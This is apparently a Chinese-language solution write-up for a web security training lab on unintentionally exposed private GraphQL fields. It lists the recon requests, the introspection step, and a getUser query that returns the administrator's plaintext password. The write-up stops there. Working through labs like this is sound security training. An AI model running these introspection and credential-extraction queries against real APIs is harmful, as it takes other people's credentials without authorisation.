# 实验室：私有 GraphQL 字段的意外暴露

本实验室的用户管理功能由 GraphQL 端点提供支持。实验室存在访问控制漏洞，你可以诱使 API 泄露用户凭证字段。

要解决本实验，请以管理员身份登录并删除用户 `carlos`。

详细了解 [在 Burp Suite 中使用 GraphQL](/burp/documentation/desktop/testing-workflow/working-with-graphql)。

## 步骤

侦察
- 访问首页
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net
    ```

    - 响应
        ```html
        <section id="blog-list" class="blog-list">
        </section>
        <script src="/resources/js/gqlUtil.js"></script>
        <script src="/resources/js/blogSummaryGql.js"></script>
        <script>
            displayContent('/post', 'postId')
        </script>
        ```

- 略读 gqlUtil JS 文件
    ```js
    fetch(
            '/graphql/v1', {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(query)
            }
    ```
    - 揭示 GQL 端点 `/graphql/v1`

- 略读 blogSummaryGql JS 文件
    ```js
    const QUERY = `
    query ${OPERATION_NAME} {
        getAllBlogPosts {
            image
            title
            summary
            id
        }
    }`;
    ```
    - 显示博客数据的查询结构

- 访问登录页面
    ```http
    GET /login HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应
        ```html
        <script src='/resources/js/gqlUtil.js'></script>
        <script src='/resources/js/loginGql.js'></script>
        ```

- 略读 loginGql JS 文件
    ```js
    const OPERATION_NAME = 'login';

    const MUTATION = `
        mutation ${OPERATION_NAME}($input: LoginInput!) {
            login(input: $input) {
                token
                success
            }
        }`;

    const UNEXPECTED_ERROR = 'Unexpected error while trying to log in'
    const INVALID_CREDENTIALS = 'Invalid username or password.'

    const getLoginMutation = (username, password) => ({
        query: MUTATION,
        operationName: OPERATION_NAME,
        variables: {
            input: {
                username,
                password
            }
        }
    });
    ```
    - 提交用户名与密码，返回 token 与 成功标志变量

探测
- 发送 GQL 请求到重复器，设置自省查询
- 复制响应的模式 JSON 到可视化应用中分析
    - 查询兴趣点 `getUser(id:Int!): User`
    - `User` 对象
        ```graphql
        User 
        id: Int! 
        username: String! 
        password: String!
        ```

测试
- 构建用户查询 GQL，使用 id 查询用户数据

    ```graphql
    query {
        getUser(id:1){
            username,
            password
        }
    }
    ```
    - 响应
        ```json
        {
            "data": {
                "getUser": {
                    "username": "administrator",
                    "password": "acdge2uyb64wb2vyvmux"
                }
            }
        }
        ```
